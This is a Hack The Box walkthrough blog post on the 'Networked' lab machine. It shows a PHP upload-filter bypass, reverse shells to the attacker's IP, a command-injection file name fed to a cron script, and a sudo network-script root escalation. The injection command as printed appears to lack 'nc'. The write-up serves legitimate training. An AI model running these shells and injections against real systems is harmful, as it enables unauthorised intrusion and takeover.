---
layout: post
title: "HTB-Networked"
categories: HTB-Walkthrough
---


![networked](/assets/img/networked/networked1.png)


This box was 'Active' when I first compromised it, and in my rush to elevate my 'status' on HTB 
I was left with the nagging thought that I didn't fully understand why my privesc to root worked. I made a mental note to come back and have another look.

Nmap first:

```
nmap 10.10.10.146 -sV -Pn |tee -a net.txt
```

```

Nmap scan report for 10.10.10.146
Host is up (0.12s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
443/tcp closed https

```


<hr width="250" size="6">


Checking out the webserver on port 80 first.

There's a hint in the source:

![web](/assets/img/networked/net-web.png)



```
python3 /opt/dirsearch/dirsearch.py -u http://10.10.10.146/ -w /root/wordlists/SecLists/Discovery/Web-Content/common.txt -e .gif
```

![backup](/assets/img/networked/net-backup.png)


```
tar xvf backup.tar

index.php
lib.php
photos.php
upload.php

```

`http://10.10.10.146/upload.php`

![uploadphp](/assets/img/networked/net-uploadphp.png)


<h3>Exploit Upload Evil.php.gif</h3>

We should upload evil.php
Rename it evil.php.gif and preprend GIF89 to the top of the file.

Trigger it by browsing to:
```
http://10.10.10.146/photos.php
```

![photosphp](/assets/img/networked/net-photosphp.png)


```

listening on [any] 6969 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.146] 33466
Linux networked.htb 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 03:58:47 up  2:44,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ 

```

<hr width="250" size="6">



<h3>Privesc to Guly</h3>


There's an interesting php file in guly's home directory:



```

cat check_attack.php

<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>

```


This line is vulnerable to a code injection:
```
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```

It will execute the removal of the file, but we can append a second command to the first which will be 
executed by `guly`.


Go to the /var/www/html/uploads/ folder.
guly's php script pulls from here, we can use `touch` to create a file and execute an additional command.


we cannot use the normal " nc 10.10.14.7 -e /bin/bash" command, so we need an alternative.


```
bash-4.2$ touch "test  && 10.10.14.7 9999 --sh-exec bash"
```

catch the shell on `nc -nlvp 9999`

![gulyshell](/assets/img/networked/net-gulyshell.png)


and get the user flag:

```

ls -la
total 28
drwxr-xr-x. 2 guly guly 159 Jul  9  2019 .
drwxr-xr-x. 3 root root  18 Jul  2  2019 ..
lrwxrwxrwx. 1 root root   9 Jul  2  2019 .bash_history -> /dev/null
-rw-r--r--. 1 guly guly  18 Oct 30  2018 .bash_logout
-rw-r--r--. 1 guly guly 193 Oct 30  2018 .bash_profile
-rw-r--r--. 1 guly guly 231 Oct 30  2018 .bashrc
-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php
-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly
-r--------. 1 guly guly  33 Oct 30  2018 user.txt                                                                  
-rw-------  1 guly guly 639 Jul  9  2019 .viminfo                                                                  
cat user.txt                                                                                                       
52xxxxxxxxxxxxxxxxxxxxxxxxxxxxc5  

```


<h3>Privesc to Root</h3>


sudo su fails, as expected but we can list sudo commands for `guly` with `sudo -l`.

![sudol](/assets/img/networked/net-sudol.png)


lets have a look at the file:

```

cat changename.sh

#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
y
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done

```

This looks a bit dangerous. A bit like a 'Do It Yourself' `sudo su` command that can generate the shell of any user.



test it out:

run the file....
```
sudo /usr/local/sbin/changename.sh
```

then enter `sudo su` for everything......
get root shell.....

```

[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
sudo /usr/local/sbin/changename.sh
interface NAME:
sudo su
sudo su
interface PROXY_METHOD:
sudo su
sudo su
interface BROWSER_ONLY:
sudo su
sudo su
interface BOOTPROTO:
sudo su
sudo su
[root@networked network-scripts]# cat /root/root.txt
cat /root/root.txt
0axxxxxxxxxxxxxxxxxxxxxxxxxxxx82
[root@networked network-scripts]#

```

I guess it was executing `su` as root, either from the initial `sudo` executing the script,
or one of the entries in the 'user input' parts but I didn't stick around long enough to reason why, 
I just grabbed the flag and ran!

<h3>Revisited</h3>


I had intended to revisit this box to work out why my 'keyboard mashing' privesc worked...but I didnt; so when the box was retired I had a look at some write-ups for the box; [0xdf's writeup](https://0xdf.gitlab.io/2019/11/16/htb-networked.html) investigates
this last phenomenom, and finds that the script's regex sanitizes the first bit of text but executes what comes after the space.

so it executed the `su` after the space....so I could have typed `foo su` or 'foo /bin/sh' for just the first entry and got the same result.

revisiting the box, I confirm this:

![foosu](/assets/img/networked/net-foosu.png)


:)




